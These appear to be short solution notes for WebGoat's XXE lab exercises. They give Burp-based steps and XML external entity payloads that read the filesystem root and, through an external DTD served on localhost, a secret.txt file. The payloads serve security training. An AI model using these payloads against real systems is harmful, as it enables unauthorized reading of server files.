# XXE
### 4
- Open Burp.
- Catch request.
- Add this:
solution is in 
<?xml version="1.0"?>
 <!DOCTYPE comment [
<!ENTITY js SYSTEM "file:///"> 
]>
<comment><text>&js;</text></comment>

- Send

### 7 
- Open Burp
- Catch request
- Change Content-Type to - application/xml
- and change body to 
<!DOCTYPE user [<!ENTITY js SYSTEM "file:///"> ]><comment><text>&js;</text></comment>

### 10
attack_11_3.dtd file:
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY ping SYSTEM 'file:///home/webgoat/.webgoat-8.2.2//XXE/secret.txt'>


<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://localhost:9090/files/gabriel/atack_11_3.dtd">
%remote;
]>
<comment>
  <text>test&ping;</text>
</comment>

then content of secret.txt will appear in comment section.